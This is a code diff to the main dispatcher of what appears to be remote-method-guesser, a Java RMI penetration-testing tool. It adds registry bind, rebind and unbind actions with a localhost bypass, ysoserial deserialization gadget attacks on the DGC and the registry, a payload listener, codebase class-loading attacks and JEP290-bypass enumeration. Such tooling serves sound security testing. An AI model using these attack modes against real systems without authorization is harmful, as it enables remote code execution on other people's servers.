@@ -11,12 +11,15 @@ import org.apache.commons.cli.CommandLine;
 
 import de.qtc.rmg.exceptions.UnexpectedCharacterException;
 import de.qtc.rmg.internal.ArgumentParser;
+import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.internal.MethodCandidate;
 import de.qtc.rmg.io.Formatter;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.WordlistHandler;
+import de.qtc.rmg.operations.DGCClient;
 import de.qtc.rmg.operations.MethodAttacker;
 import de.qtc.rmg.operations.MethodGuesser;
+import de.qtc.rmg.operations.RegistryClient;
 import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.RMIWhisperer;
 import de.qtc.rmg.utils.SampleWriter;
@@ -40,27 +43,7 @@ public class Starter {
 
         if( parser.getArgumentCount() >= 3 ) {
             action = parser.getPositionalString(2);
-
-            if( action.equals("attack") || action.equals("codebase")) {
-                parser.checkArgumentCount(5);
-
-                if(!commandLine.hasOption("signature")) {
-                    Logger.eprintlnMixedYellow("The", "--signature", "option is required for " + action + " mode.");
-                    RMGUtils.exit();
-                }
-            }
-
-            if( action.equals("codebase" )) {
-                String serverAddress = parser.getPositionalString(3);
-
-                if( !serverAddress.startsWith("http") )
-                    serverAddress = "http://" + serverAddress + "/";
-
-                if( !serverAddress.endsWith("/") )
-                    serverAddress = serverAddress + "/";
-
-                System.setProperty("java.rmi.server.codebase", serverAddress);
-            }
+            parser.prepareAction(action);
         }
 
         Properties config = new Properties();
@@ -78,8 +61,9 @@ public class Starter {
         String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("template-folder"));
         String wordlistFolder = commandLine.getOptionValue("wordlist-folder", config.getProperty("wordlist-folder"));
         String ysoserialPath = commandLine.getOptionValue("yso", config.getProperty("ysoserial-path"));
-        String functionSignature = commandLine.getOptionValue("signature", null);
+        String functionSignature = commandLine.getOptionValue("signature", "");
         String boundName = commandLine.getOptionValue("bound-name", null);
+        String regMethod = parser.validateRegMethod(commandLine.getOptionValue("reg-method", "lookup"));
 
         Logger.verbose = !commandLine.hasOption("json");
         boolean sslValue = commandLine.hasOption("ssl");
@@ -87,39 +71,77 @@ public class Starter {
         boolean updateWordlists = commandLine.hasOption("update");
         boolean createSamples = commandLine.hasOption("create-samples");
         boolean zeroArg = commandLine.hasOption("zero-arg");
+        boolean localhostBypass = commandLine.hasOption("localhost-bypass");
 
         if( commandLine.hasOption("no-color") ) {
             Logger.disableColor();
         }
 
         Formatter format = new Formatter(commandLine.hasOption("json"));
-        RMIWhisperer rmi = new RMIWhisperer();
+        RMIWhisperer rmi = new RMIWhisperer(host, port, sslValue, followRedirect);
 
         RMGUtils.init();
-        RMGUtils.enableCodebase();
         RMGUtils.disableWarning();
+        RMGUtils.showStackTrace(commandLine.hasOption("stack-trace"));
 
-        rmi.connect(host, port, sslValue, followRedirect);
-        String[] boundNames = rmi.getBoundNames();
+        String[] boundNames = null;
+        HashMap<String,String> allClasses = null;
+        ArrayList<HashMap<String,String>> boundClasses = null;
 
-        ArrayList<HashMap<String,String>> boundClasses = rmi.getClassNames(boundNames);
-        HashMap<String,String> allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
-        allClasses.putAll(boundClasses.get(1));
+        if( !action.matches("bind|dgc|rebind|reg|unbind|listen") && !functionSignature.matches("reg|dgc")) {
+
+            if(action.matches("enum"))
+                RMGUtils.enableCodebase();
+
+            rmi.locateRegistry();
+
+            boundNames = rmi.getBoundNames(boundName);
+
+            boundClasses = rmi.getClassNames(boundNames);
+            allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
+            allClasses.putAll(boundClasses.get(1));
+        }
 
         MethodCandidate candidate = null;
-        if( functionSignature != null ) {
+        if( functionSignature != "" && !functionSignature.matches("reg|dgc") ) {
 
             try {
                 candidate = new MethodCandidate(functionSignature);
 
             } catch (CannotCompileException | NotFoundException e) {
-                Logger.eprintln("Supplied method signature seems to be invalid.");
-                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
-                RMGUtils.exit();
+                ExceptionHandler.invalidSignature(functionSignature);
             }
         }
 
         switch( action ) {
+
+            case "bind":
+            case "rebind":
+                String bName = parser.getPositionalString(3);
+                String listener = parser.getPositionalString(4);
+                String[] split = listener.split(":");
+
+                if( split.length != 2 || !split[1].matches("\\d+") ) {
+                    ExceptionHandler.invalidListenerFormat(false);
+                }
+
+                String listenerHost = split[0];
+                int listenerPort = Integer.valueOf(split[1]);
+
+                RegistryClient reg = new RegistryClient(rmi);
+                if(action.equals("bind"))
+                    reg.bindObject(bName, listenerHost, listenerPort, localhostBypass);
+                else
+                    reg.rebindObject(bName, listenerHost, listenerPort, localhostBypass);
+                break;
+
+
+            case "unbind":
+                bName = parser.getPositionalString(3);
+                reg = new RegistryClient(rmi);
+                reg.unbindObject(bName, localhostBypass);
+                break;
+
 
             case "guess":
                 if( !RMGUtils.containsUnknown(boundClasses.get(1)) )
@@ -135,7 +157,8 @@ public class Starter {
                         WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlists);
                         candidates = wlHandler.getWordlistMethods();
                     } catch( IOException e ) {
-                        Logger.eprintlnMixedYellow("Caught exception while reading wordlist file(s):", e.getMessage());
+                        Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
+                        RMGUtils.stackTrace(e);
                         RMGUtils.exit();
                     }
                 }
@@ -159,7 +182,7 @@ public class Starter {
 
                     for(String name : results.keySet()) {
 
-                        Logger.printlnMixedYellow("Creating samples for bound name", name);
+                        Logger.printlnMixedYellow("Creating samples for bound name", name + ".");
                         Logger.increaseIndent();
 
                         className = boundClasses.get(1).get(name);
@@ -170,9 +193,7 @@ public class Starter {
                     }
 
                 } catch (IOException | CannotCompileException | NotFoundException e) {
-                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during sample creation.");
-                    RMGUtils.stackTrace(e);
-                    RMGUtils.exit();
+                    ExceptionHandler.unexpectedException(e, "sample", "creation", true);
 
                 } catch (UnexpectedCharacterException e) {
                     Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
@@ -184,27 +205,45 @@ public class Starter {
                 Logger.decreaseIndent();
                 break;
 
-            case "attack":
+
+            case "method":
+            case "dgc":
+            case "reg":
+            case "listen":
 
                 String gadget = parser.getPositionalString(3);
                 String command = parser.getPositionalString(4);
 
                 if(ysoserialPath == null) {
-                    Logger.eprintlnMixedYellow("Path for", "ysoserial.jar", "is null.");
+                    Logger.eprintlnMixedYellow("Path for", "ysoserial JAR", "is null.");
                     Logger.increaseIndent();
                     Logger.eprintlnMixedYellow("Check your configuration file or specify it on the command line using the", "--yso", "parameter");
                     RMGUtils.exit();
                 }
 
+                if( action.equals("listen") ) {
+                    RMGUtils.createListener(ysoserialPath, String.valueOf(port), gadget, command);
+                }
+
                 Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
-                MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
-                attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
+
+                if( action.equals("method") ) {
+                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
+                    attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
+                } else if( action.equals("dgc" )) {
+                    DGCClient dgc = new DGCClient(rmi);
+                    dgc.attackCleanCall(payload);
+                } else {
+                    reg = new RegistryClient(rmi);
+                    reg.gadgetCall(payload, regMethod, localhostBypass);
+                }
 
                 break;
 
+
             case "codebase":
 
-                String className = parser.getPositionalString(4);
+                String className = parser.getPositionalString(3);
 
                 payload = null;
 
@@ -213,24 +252,52 @@ public class Starter {
                     payload = ((Class)payload).newInstance();
 
                 } catch (CannotCompileException | NotFoundException | InstantiationException | IllegalAccessException e) {
-                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during payload creation.");
-                    RMGUtils.stackTrace(e);
-                    RMGUtils.exit();
+                    ExceptionHandler.unexpectedException(e, "payload", "creation", true);
                 }
 
-                attacker = new MethodAttacker(rmi, allClasses, candidate);
-                attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
+                if( candidate != null ) {
+                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
+                    attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
+                } else if( functionSignature.matches("dgc") ) {
+                    DGCClient dgc = new DGCClient(rmi);
+                    dgc.codebaseCleanCall(payload);
+                } else if( functionSignature.matches("reg") ) {
+                    reg = new RegistryClient(rmi);
+                    reg.codebaseCall(payload, regMethod, localhostBypass);
+                }
 
                 break;
 
-            default:
-                Logger.printlnMixedYellow("Unknown action:", action, ".");
-                Logger.printlnMixedBlue("Performing default action:", "enum");
-
             case "enum":
                 format.listBoundNames(boundNames, boundClasses);
+
                 Logger.println("");
                 format.listCodeases();
+
+                Logger.println("");
+                RegistryClient registryClient = new RegistryClient(rmi);
+                boolean marshal = registryClient.enumerateStringMarshalling();
+
+                Logger.println("");
+                registryClient.enumCodebase(marshal, regMethod, localhostBypass);
+
+                Logger.println("");
+                registryClient.enumLocalhostBypass();
+
+                Logger.println("");
+                DGCClient dgc = new DGCClient(rmi);
+                dgc.enumDGC();
+
+                Logger.println("");
+                dgc.enumJEP290();
+
+                Logger.println("");
+                registryClient.enumJEP290Bypass(regMethod, localhostBypass, marshal);
+                break;
+
+            default:
+                Logger.printlnPlainMixedYellow("Unknown action:", action);
+                parser.printHelp();
         }
     }
 }
